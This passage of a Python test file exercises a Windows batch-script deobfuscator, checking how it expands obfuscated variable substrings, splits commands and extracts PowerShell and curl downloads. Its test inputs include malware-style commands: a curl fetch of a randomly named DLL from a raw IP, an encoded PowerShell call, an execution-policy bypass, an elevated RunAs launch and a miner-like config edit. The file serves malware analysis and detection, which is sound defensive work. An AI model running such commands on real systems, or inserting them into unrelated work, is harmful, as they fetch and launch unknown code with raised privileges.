':~-17,1%%':~17,1%%':~17,1%%':~17,1%%':~5,1%%':~28,1%%':~-143,1%%':~-143,1%%':~17,1%%':~80,1%%':~17,1%%':~-143,1%%':~17,1%%':~91,1%%':~-130,1%%':~-143,1%%':~17,1%%':~17,1%%':~157,1%%':~70,1%%':~17,1%%':~-143,1%%':~17,1%%':~-138,1%%':~39,1%%':~-143,1%%':~-143,1%%':~17,1%%':~-84,1%%':~17,1%%':~-143,1%%':~-143,1%%':~121,1%%':~-153,1%%':~-143,1%%':~-143,1%%':~-143,1%%':~109,1%%':~-143,1%%':~-143,1%%':~17,1%%':~58,1%%':~-143,1%%':~17,1%%':~17,1%%':~-41,1%%':~-143,1%%':~17,1%%':~17,1%%':~-15,1%%':~-143,1%%':~17,1%%':~17,1%%':~-104,1%%':~17,1%%':~17,1%%':~17,1%%':~17,1%%':~17,1%%':~17,1%%':~-143,1%%':~-57,1%%':~52,1%%':~-145,1%%':~-143,1%%':~17,1%%':~-143,1%%':~128,1%%':~-143,1%%':~-143,1%%':~-143,1%%':~115,1%%':~17,1%%':~-143,1%%':~-143,1%%':~38,1%%':~98,1%%':~-143,1%%':~-143,1%%':~-143,1%%':~-119,1%%':~-143,1%%':~-143,1%%':~17,1%%':~74,1%%':~17,1%%':~17,1%%':~-143,1%%':~-67,1%%':~42,1%%':~-143,1%%':~17,1%%':~17,1%%':~-8,1%%':~17,1%%':~-143,1%%':~-143,1%%':~51,1%%':~85,1%%':~-135,1%%':~-143,1%%':~17,1%%':~17,1%%':~105,1%%':~-91,1%%':~17,1%%':~17,1%%':~17,1%%':~-128,1%%':~-140,1%%':~-143,1%%':~17,1%%':~17,1%%':~-106,1%%':~-117,1%%':~17,1%%':~-143,1%%':~17,1%%':~159,1%%':~17,1%%':~-143,1%%':~-143,1%%':~49,1%%':~17,1%%':~-143,1%%':~-143,1%%':~-133,1%%':~-143,1%%':~-143,1%%':~-143,1%%':~3,1%%':~-143,1%%':~17,1%%':~17,1%%':~68,1%%':~-143,1%%':~17,1%%':~-143,1%%':~-141,1%%':~-154,1%%':~17,1%%':~-143,1%%':~-143,1%%':~154,1%%':~-143,1%%':~-143,1%%':~17,1%%':~-71,1%%':~17,1%%':~-143,1%%':~17,1%%':~107,1%%':~-96,1%%':~101,1%%':~-76,1%%':~-143,1%%':~17,1%%':~17,1%%':~-20,1%%':~-131,1%%':~17,1%%':~17,1%%':~-143,1%%':~78,1%%':~155,1%%':~17,1%%':~-143,1%%':~17,1%%':~-26,1%%':~-143,1%%':~17,1%%':~-143,1%%':~63,1%%':~17,1%%':~-143,1%%':~-143,1%%':~-151,1%%':~17,1%%':~17,1%%':~17,1%%':~83,1%%':~-143,1%%':~17,1%%':~17,1%%':~-113,1%%':~-143,1%%':~17,1%%':~-143,1%%':~-10,1%%':~17,1%%':~17,1%%':~17,1%%':~-24,1%%':~17,1%%':~17,1%%':~17,1%%':~11,1%%':~122,1%%':~-143,1%%':~17,1%%':~-143,1%%':~-159,1%%':~-143,1%%':~17,1%%':~-143,1%%':~-146,1%%':~-143,1%%':~17,1%%':~17,1%%':~-43,1%%':~17,1%%':~-143,1%%':~17,1%%':~130,1%%':~17,1%%':~17,1%%':~-143,1%%':~-115,1%%':~-143,1%%':~17,1%%':~17,1%%':~34,1%%':~22,1%%':~-124,1%%':~43,1%%':~-96,1%%':~-154,1%%':~89,1%%':~-145,1%%':~98,1%%':~-82,1%%':~-5,1%%':~42,1%%':~-138,1%%':~36,1%%':~-117,1%%':~64,1%%':~6,1%%':~89,1%%':~-8,1%%':~97,1%%':~47,1%%':~132,1%%':~27,1%%':~78,1%%':~83,1%%':~-140,1%%':~39,1%%':~-32,1%%':~-118,1%%':~22,1%%':~-124,1%%':~-117,1%%':~64,1%%':~-154,1%%':~-79,1%%':~70,1%%':~61,1%%':~39,1%%':~-79,1%%':~89,1%%':~-96,1%%':~-38,1%%':~-121,1%%':~-148,1%%':~81,1%%':~64,1%%':~141,1%%':~64,1%%':~81,1%%':~-121,1%%':~85,1%%':~64,1%%':~141,1%%':~64,1%%':~-5,1%%':~30,1%%':~-121,1%%':~122,1%%':~43,1%%':~-135,1%%':~-90,1%%':~-38,1%%':~22,1%%':~-96,1%%':~-38,1%%':~-19,1%%':~-79,1%%':~-99,1%%':~-90,1%%':~-121,1%%':~-79,1%%':~89,1%%':~56,1%%':~134,1%%':~-38,1%%':~7,1%%':~81,1%%':~-138,1%%':~-138,1%%':~36,1%%':~64,1%%':~61,1%%':~84,1%%':~-90,1%%':~143,1%%':~134,1%%0 %':~-138,1%%':~-138,1%%':~36,1%%':~-117,1%%':~64,1%%':~6,1%%':~89,1%%':~-130,1%%':~-30,1%%':~-76,1%%':~69,1%%':~-82,1%%':~-136,1%%':~85,1%%':~-138,1%%':~36,1%%':~43,1%%':~64,1%%':~-154,1%%':~89,1%%':~-36,1%%':~39,1%%':~27,1%%':~70,1%%':~78,1%%':~119,1%%':~61,1%%':~20,1%%':~-138,1%%':~-124,1%%':~-117,1%%':~64,1%%':~-154,1%%':~-71,1%%':~85,1%%':~-91,1%%':~72,1%%':~78,1%%':~119,1%%':~63,1%%':~-5,1%%':~22,1%%':~36,1%%':~-117,1%%':~-76,1%%':~-153,1%%':~-154,1%%':~-19,1%%':~70,1%%':~-14,1%%':~-38,1%%':~89,1%%':~-141,1%%':~43,1%%':~-71,1%%':~-141,1%%':~52,1%%':~89,1%%':~19,1%%':~-154,1%%':~89,1%%':~51,1%%':~-138,1%%':~22,1%%':~36,1%%':~-117,1%%':~64,1%%':~6,1%%':~89,1%%':~7,1%%':~119,1%%':~-88,1%%':~-106,1%%':~72,1%%':~-82,1%%':~-77,1%%':~-153,1%%':~-138,1%%':~-124,1%%':~64,1%%':~-5,1%%':~-135,1%%':~-154,1%%':~22,1%%':~22,1%%':~-124,1%%':~64,1%%':~-99,1%%':~84,1%%':~70,1%%':~-71,1%%':~-69,1%"  # noqa: E501
        cmd2 = deobfuscator.normalize_command(cmd)
        for cmd3 in deobfuscator.get_commands(cmd2):
            cmd4 = deobfuscator.normalize_command(cmd3)
            deobfuscator.interpret_command(cmd4)

        assert deobfuscator.variables["'"].endswith("^N^F^*")

    @staticmethod
    def test_special_char_var_name():
        cmd = '@set "ò=BbQw2 1zUta9gCFolxZSYMRJ8jE6ITy7V@md3K0XDkvWr5PN4uecHqpLnOisAfGh"'
        deobfuscator = BatchDeobfuscator()
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)

        cmd = "%ò:~33,1%%ò:~50,1%%ò:~51,1%%ò:~63,1%%ò:~15,1%%ò:~5,1%%ò:~15,1%%ò:~61,1%%ò:~61,1%"
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd2 == "@echo off"

    @staticmethod
    def test_rem_skip():
        deobfuscator = BatchDeobfuscator()

        cmd = "set EXP=value"
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)

        cmd = "echo *%EXP%*"
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)

        assert cmd2 == "echo *value*"

        cmd = "REM echo *%EXP%*"
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)

        assert cmd2 == cmd

    @staticmethod
    def test_fun_var_replace():
        deobfuscator = BatchDeobfuscator()

        cmd = "%comspec%"
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd2 == "C:\\WINDOWS\\system32\\cmd.exe"

        cmd = "%comspec:cmd=powershell%"
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd2 == "C:\\WINDOWS\\system32\\powershell.exe"

    @staticmethod
    @pytest.mark.skip()
    def test_bobbystacksmash():
        # TODO: Improve deobfuscation
        # Some examples taken from https://github.com/bobbystacksmash/CMD-DeObfuscator
        deobfuscator = BatchDeobfuscator()

        # Empty string removal
        # https://github.com/bobbystacksmash/CMD-DeObfuscator#empty-string-removal
        cmd = 'pow""ersh""ell'
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd2 == "powershell"

        # String widening
        # https://github.com/bobbystacksmash/CMD-DeObfuscator#string-widening
        cmd = 'w"s"c"r"i"p"t'
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd2 == "wscript"

        # Path resolver
        # https://github.com/bobbystacksmash/CMD-DeObfuscator#path-resolver-coming-soon
        cmd = "C:\\foo\\bar\\baz\\..\\..\\..\\Windows\\System32\\cmd.exe"
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd2 == "C:\\Windows\\System32\\cmd.exe"

    @staticmethod
    def test_for():
        deobfuscator = BatchDeobfuscator()
        cmd = "for /l %%x in (1, 1, 10) do echo %%x"
        cmd2 = list(deobfuscator.get_commands(cmd))
        assert len(cmd2) == 3
        assert cmd2 == ["for /l %%x in (1, 1, 10) do (", "echo %%x", ")"]

    @staticmethod
    @pytest.mark.parametrize(
      "cmd, download_trait",
      [
        (
          "curl.exe -LO https://www.7-zip.org/a/7z1805-x64.exe",
          {"src": "https://www.7-zip.org/a/7z1805-x64.exe", "dst": "7z1805-x64.exe"},
        ),
        (
          "curl.exe -o C:\\ProgramData\\output\\output.file 1.1.1.1/file.dat",
          {"src": "1.1.1.1/file.dat", "dst": "C:\\ProgramData\\output\\output.file"},
        ),
        (
          'curl ""http://1.1.1.1/zazaz/p~~/Y98g~~/"" -o 9jXqQZQh.dll',
          {"src": "http://1.1.1.1/zazaz/p~~/Y98g~~/", "dst": "9jXqQZQh.dll"},
        ),
      ],
    )
    def test_interpret_curl(cmd, download_trait):
        deobfuscator = BatchDeobfuscator()
        deobfuscator.interpret_curl(cmd)
        assert len(deobfuscator.traits["download"]) == 1
        assert deobfuscator.traits["download"][-1][1] == download_trait

    @staticmethod
    def test_double_double_quote_stripping():
        deobfuscator = BatchDeobfuscator()
        cmd = 'c""md /C "echo A""B""C"'
        cmd2 = deobfuscator.normalize_command('c""md /C "echo A""B""C"')
        assert cmd == cmd2
        deobfuscator.interpret_command(cmd2)
        assert len(deobfuscator.exec_cmd) == 1
        assert deobfuscator.exec_cmd[0] == 'echo A""B""C'
        deobfuscator.exec_cmd.clear()

        cmd = 'cmd /C "pow""ershell -e ZQBjAGgAbwAgACIAV""wBpAHoAYQByAGQAIgA="'
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd == cmd2
        deobfuscator.interpret_command(cmd2)
        assert len(deobfuscator.exec_cmd) == 1
        assert deobfuscator.exec_cmd[0] == 'pow""ershell -e ZQBjAGgAbwAgACIAV""wBpAHoAYQByAGQAIgA='
        deobfuscator.exec_cmd.clear()

        cmd = 'pow""ershell -e ZQBjAGgAbwAgACIAV""wBpAHoAYQByAGQAIgA='
        cmd2 = deobfuscator.normalize_command(cmd)
        assert cmd == cmd2
        deobfuscator.interpret_command(cmd2)
        assert len(deobfuscator.exec_ps1) == 1
        assert deobfuscator.exec_ps1[0] == b'echo "Wizard"'
        deobfuscator.exec_ps1.clear()

    @staticmethod
    @pytest.mark.parametrize(
      "cmd, exec_cmd",
      [
        ('start /b cmd /c "echo Hi"', ["echo Hi"]),
        ('start /b /i cmd /c "echo Hi"', ["echo Hi"]),
        ('start /w cmd /c "echo Hi"', ["echo Hi"]),
        ('start/B /WAIT cmd /c "echo Hi"', ["echo Hi"]),
        ('start/WAIT /B cmd /c "echo Hi"', ["echo Hi"]),
      ],
    )
    def test_interpret_start(cmd, exec_cmd):
        deobfuscator = BatchDeobfuscator()
        deobfuscator.interpret_command(cmd)
        assert len(deobfuscator.exec_cmd) == len(exec_cmd)
        for d_e_cmd, e_cmd in zip(deobfuscator.exec_cmd, exec_cmd):
            assert d_e_cmd == e_cmd

    @staticmethod
    def test_posix_powershell():
        deobfuscator = BatchDeobfuscator()
        cmd = (
          "powershell -Command \"$out = cat '%USERPROFILE%\\jin\\config.json' | "
          "%%{$_ -replace '\\\"donate-level\\\": *\\d*,', '\\\"donate-level\\\": 1,'} | "
          "Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\\jin\\config.json'\" "
        )
        deobfuscator.interpret_command(cmd)
        assert len(deobfuscator.exec_ps1) == 1
        assert deobfuscator.exec_ps1[0] == (
          b"$out = cat '%USERPROFILE%\\jin\\config.json' | "
          b"%%{$_ -replace '\\\"donate-level\\\": *\\d*,', '\\\"donate-level\\\": 1,'} | "
          b"Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\\jin\\config.json'"
        )
        deobfuscator.exec_ps1.clear()

        cmd = (
          'powershell -noprofile -command "&{start-process powershell -ArgumentList'
          ' \'-noprofile -file \\"%scriptPath%\\"\' -verb RunAs}"'
        )
        deobfuscator.interpret_command(cmd)
        assert len(deobfuscator.exec_ps1) == 1
        assert (
          deobfuscator.exec_ps1[0]
          == b"&{start-process powershell -ArgumentList '-noprofile -file \\\"%scriptPath%\\\"' -verb RunAs}"
        )

    @staticmethod
    def test_non_posix_powershell():
        deobfuscator = BatchDeobfuscator()
        cmd = (
          'powershell -Command "Get-AppxPackage -Name "Microsoft.OneDriveSync" > '
          '"%WORKINGDIRONEDRIVE%\\OneDriveSparsePackage.txt" 2>&1'
        )
        deobfuscator.interpret_command(cmd)
        assert len(deobfuscator.exec_ps1) == 1
        assert deobfuscator.exec_ps1[0] == b'Get-AppxPackage -Name "Microsoft.OneDriveSync'
        deobfuscator.exec_ps1.clear()

        cmd = r"PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\x64\ISO\x64.ps1"
        deobfuscator.interpret_command(cmd)
        assert len(deobfuscator.exec_ps1) == 1
        assert deobfuscator.exec_ps1[0] == rb"C:\ProgramData\x64\ISO\x64.ps1"

    @staticmethod
    def test_anti_recursivity():
        deobfuscator = BatchDeobfuscator()
        cmd = 'set "str=a"'
        deobfuscator.interpret_command(cmd)

        cmd = 'set "str=!str:"=\\"!"'
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)

        cmd = "echo %str%"
        cmd2 = deobfuscator.normalize_command(cmd)

        assert cmd2 == "echo a"

    @staticmethod
    def test_anti_recursivity_with_quotes():
        deobfuscator = BatchDeobfuscator()
        cmd = 'set "str=a"a"'
        deobfuscator.interpret_command(cmd)

        cmd = 'set "str=!str:"=\\"!"'
        cmd2 = deobfuscator.normalize_command(cmd)
        deobfuscator.interpret_command(cmd2)

        cmd = "echo %str%"
        cmd2 = deobfuscator.normalize_command(cmd)

        assert cmd2 == 'echo a\\"a'

    @staticmethod
    @pytest.mark.parametrize(
      "cmd, fs",
      [
        ('set/p str="a"a" "<nul>out.txt', ["out.txt"]),
        ('set/p str="a"a" "<nul>OUt.tXt', ["out.txt"]),
        ('set/p str="a"a" ">out.txt<nul', ["out.txt"]),
        ('set/p str="a"a" ">out.txt', ["out.txt"]),
        ('set/p str="a"a" "<nul', []),
      ],
    )
    def test_set_redirection(cmd, fs):
        deobfuscator = BatchDeobfuscator()
        deobfuscator.interpret_command(cmd)
        assert list(deobfuscator.modified_filesystem.keys()) == fs

    @staticmethod
    @pytest.mark.parametrize(
      "cmd, command_list",
      [
        (
          "    curl -X POST 'http://localhost:5572/rc/noop?potato=1&sausage=2'",
          ["curl -X POST 'http://localhost:5572/rc/noop?potato=1", "sausage=2'"],
        ),
        (
          "    curl -X POST 'http://localhost:5572/rc/noop?potato=1&sausage=2'&echo A",
          ["curl -X POST 'http://localhost:5572/rc/noop?potato=1", "sausage=2'", "echo A"],
        ),
        (
          '    curl -X POST "http://localhost:5572/rc/noop?potato=1&sausage=2"&echo A',
          ['curl -X POST "http://localhost:5572/rc/noop?potato=1&sausage=2"', "echo A"],
        ),
        (
          'curl -H "Content-Type: application/json" -X POST -d \'{"potato":2,"sausage":1}\' http://localhost:5572/rc/noop',
          [
            'curl -H "Content-Type: application/json" -X POST -d \'{"potato":2,"sausage":1}\' http://localhost:5572/rc/noop'
          ],
        ),
      ],
    )
    def test_command_splitting(cmd, command_list):
        deobfuscator = BatchDeobfuscator()
        res = list(deobfuscator.get_commands(cmd))
        assert res == command_list

    @staticmethod
    def test_keep_quotes_on_set():
        deobfuscator = BatchDeobfuscator()
        cmd = 'set "ab= ""'
        res = deobfuscator.normalize_command(cmd)
        assert res == cmd
